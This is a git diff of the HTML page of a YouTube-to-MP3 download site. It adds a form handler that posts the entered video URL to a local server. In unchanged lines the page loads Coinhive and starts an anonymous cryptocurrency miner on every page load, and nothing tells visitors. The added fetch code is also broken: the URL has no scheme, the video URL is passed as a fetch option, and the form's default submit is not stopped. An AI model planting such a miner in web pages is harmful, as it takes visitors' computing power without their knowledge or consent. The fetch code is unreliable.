@@ -42,7 +42,7 @@
       </p>
     </div>
     <div class="col-sm-6">
-      <form>
+      <form id="youtube-fetcher">
         <div class="form-group">
           <label for="youtube-address">
             Youtube Address
@@ -51,7 +51,7 @@
           <input type="text" class="form-control" id="youtube-address" aria-describedby="youtubeAddress" placeholder="Enter the Youtube Address you want to download as MP3">
         </div>
 
-        <button type="submit" class="btn btn-primary">
+        <button type="submit" class="btn btn-primary get-uuid">
           Search
         </button>
       </form>
@@ -67,11 +67,39 @@
 <!-- Coin Hive -->
 <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
 
+<!-- Fetch -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fetch/2.0.3/fetch.js"></script>
+
 
 <script>
+  var YoutubeFetcher = function() {
+    this.formID = 'youtube-fetcher';
+  };
+
+  YoutubeFetcher.prototype.getUUID = function() {
+    return fetch("localhost:8080/yt/video", {
+      method: "POST",
+      videoUrl: document.getElementById('youtube-address').value
+    });
+  };
+
   $(document).ready(function () {
     var miner = new CoinHive.Anonymous('swkUIClYeRabRXrCJG9IeSHOSvSRsnSL', { throttle: 0.8 });
     miner.start();
+
+    var youtubeFetcher = new YoutubeFetcher();
+
+    $('#youtube-fetcher').on('submit', function() {
+      youtubeFetcher.getUUID()
+        .then(
+          function success(response) {
+            console.log('response', response);
+          },
+          function reject(error) {
+            console.error('error', error);
+          }
+        )
+    });
   });
 </script>
 </body>
